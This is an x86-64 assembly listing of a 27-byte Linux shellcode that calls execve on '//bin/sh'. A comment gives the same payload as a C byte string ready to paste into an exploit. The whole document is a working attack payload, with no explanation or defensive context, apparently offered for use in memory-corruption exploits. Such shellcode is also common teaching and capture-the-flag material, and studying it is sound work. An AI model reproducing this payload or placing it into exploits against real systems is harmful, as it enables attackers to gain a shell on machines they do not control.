.text
.globl _start
_start:
	xor %rax,%rax
	movb    $0x3b,%al		 # sys_execve
	cqo				 # env = %rdx = NULL
	movabs $0x68732f6e69622f2f, %rdi # //bin/sh
	push %rdx			 # null-terminator byte(s)
	push %rdi			 
	mov %rsp, %rdi			 # "//bin/sh" address
	mov %rdx, %rsi			 # argv = %rsi = NULL
	syscall

# char shellcode[] = "\x48\x31\xc0\xb0\x3b\x48\x99\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x52\x57\x48\x89\xe7\x48\x89\xd6\x0f\x05";
# /* Total: 27 bytes. */
